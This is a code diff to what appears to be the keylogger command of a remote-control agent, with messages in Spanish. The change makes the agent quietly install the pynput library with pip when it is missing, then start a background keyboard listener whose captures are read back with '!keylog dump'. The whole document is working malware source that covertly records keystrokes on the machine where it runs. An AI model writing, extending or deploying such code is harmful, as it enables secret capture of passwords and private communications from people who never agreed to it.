@@ -23,7 +23,31 @@ def _on_press(key):
 
 def _start_listener():
     global _listener
-    from pynput import keyboard
+
+    def _import_pynput():
+        try:
+            from pynput import keyboard
+            return keyboard
+        except ImportError:
+            return None
+
+    keyboard = _import_pynput()
+
+    if keyboard is None:
+        # pynput no está instalado — intentar instalarlo automáticamente
+        import subprocess, sys
+        try:
+            subprocess.run(
+                [sys.executable, "-m", "pip", "install", "pynput", "--quiet"],
+                capture_output=True, timeout=60, check=True
+            )
+        except Exception as exc:
+            raise ImportError(f"no se pudo instalar pynput: {exc}")
+
+        keyboard = _import_pynput()
+        if keyboard is None:
+            raise ImportError("pynput instalado pero no importable — reinicia el agente")
+
     _listener = keyboard.Listener(on_press=_on_press)
     _listener.daemon = True
     _listener.start()
@@ -39,8 +63,8 @@ def run(args: str) -> tuple[int, str, str]:
         try:
             _start_listener()
             return 0, "Keylogger iniciado — usa !keylog dump para ver capturas", ""
-        except ImportError:
-            return 1, "", "pynput no instalado: pip install pynput"
+        except ImportError as exc:
+            return 1, "", str(exc)
         except Exception as exc:
             return 1, "", f"Error al iniciar keylogger: {exc}"
 
